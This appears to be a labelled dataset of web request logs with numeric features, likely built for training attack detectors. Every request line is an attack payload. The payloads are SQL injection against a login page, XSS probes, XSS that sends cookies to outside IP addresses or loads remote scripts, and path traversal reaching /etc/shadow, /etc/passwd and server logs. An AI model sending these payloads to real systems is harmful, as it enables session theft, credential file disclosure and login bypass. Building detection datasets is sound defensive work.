75,2,200,2357,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2876,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7005,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2951,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3963,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2411,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7514,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3729,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5652,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5453,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2596,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1008,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4231,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6653,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2991,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5270,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7766,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3709,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5504,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2621,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3509,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6851,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4934,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7088,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6610,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6589,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2706,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1713,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6866,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4081,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2890,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4458,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7866,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7378,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5856,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5129,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5932,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
78,1,200,1717,8,27,16,6,2,GET /?p=<script>%window.open('http://217.45.100.86/944457')3C/script> HTTP/1.1
51,1,200,3984,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5465,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1083,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3584,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6004,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3128,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1621,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3292,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7457,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
101,1,200,5093,7,54,19,6,2,GET /?file=<script>window.location='http://188.72.178.148/?cookie='+document.cookie</script> HTTP/1.1
50,1,200,5822,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3512,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7005,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,1635,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2442,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4670,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7728,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6691,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,5310,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6753,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7965,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,5305,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,7606,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,1391,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,1450,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4182,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4241,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6824,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
61,1,200,2414,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1591,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7561,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,3845,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4908,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,5255,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4992,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6102,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1632,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4021,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4289,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2327,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
51,1,200,1370,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2105,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1413,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2952,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6609,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7219,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3986,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2736,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2123,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1693,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1405,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7460,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7195,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2481,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6754,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1240,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4208,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
60,1,200,1745,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,4842,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6242,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7819,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7409,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7262,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7979,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2959,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1500,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1005,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,3525,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2439,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1094,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7297,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6206,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1098,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,3095,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7971,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
85,1,200,2473,7,33,17,6,2,GET /?search=<script><script+src="http://212.195.102.32/589429.js=></script> HTTP/1.1
57,1,200,4769,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6235,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,5610,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,2221,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4258,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1383,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6516,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6596,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3340,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1092,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4821,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3086,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1145,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6558,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6644,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1119,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1193,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6580,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6288,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6439,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,4295,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,4412,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3589,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1485,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3385,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3032,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2984,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6075,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,7103,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2233,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1559,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,7438,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4501,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2014,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1716,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1885,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4786,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2980,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6466,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5432,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2547,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,7633,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,3056,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4357,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2877,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5146,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5022,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5813,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1985,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1078,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,7701,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6749,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,5337,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7382,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1899,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,4534,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1958,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5897,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7941,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7668,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2564,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7471,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2988,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5092,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1226,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2710,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5453,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,6935,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
80,1,200,7879,7,38,14,5,2,GET /?file=<script>window.location.href="http://75.153.91.255"</script> HTTP/1.1
96,1,200,7779,7,51,19,6,2,GET /?p=<script>window.location='http://15.99.211.38/?cookie='+document.cookie</script> HTTP/1.1
53,1,200,6117,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1118,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6724,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3777,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,5645,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6822,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4365,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3196,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3327,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1838,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2006,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
49,1,200,7550,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2946,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,7591,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,1472,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,7075,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2856,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3090,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2498,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,1768,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2877,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,7558,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5698,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3685,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3599,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5290,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5811,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,6233,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
77,1,200,6852,7,35,14,5,2,GET /?p=<script>window.location.href="http://150.14.243.36"</script> HTTP/1.1
58,1,200,3774,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6781,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6112,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,7170,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,4630,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5055,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5326,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,1414,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,4969,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,7281,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6877,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6855,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2727,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2951,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,1660,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2235,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,4369,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5134,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,3153,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
84,1,200,4347,7,31,17,6,2,GET /?file=<script><script+src="http://243.180.151.213/778777.js=></script> HTTP/1.1
62,1,200,3182,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,2136,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1726,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,3700,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6201,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6998,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,7892,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6838,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1614,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,7597,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1155,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5795,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5709,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,3048,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
84,1,200,5703,7,33,17,6,2,GET /?search=<script><script+src="http://17.126.191.14/217298.js=></script> HTTP/1.1
46,1,200,4277,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,3987,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,6846,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,7088,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5166,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5762,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1372,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,6156,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1067,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
79,1,200,3181,7,38,14,5,2,GET /?file=<script>window.location.href="http://163.208.0.32"</script> HTTP/1.1
81,1,200,2589,7,31,17,6,2,GET /?file=<script><script+src="http://3.42.212.197/622934.js=></script> HTTP/1.1
48,1,200,1123,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5496,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2255,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2352,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2482,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2505,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,1206,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
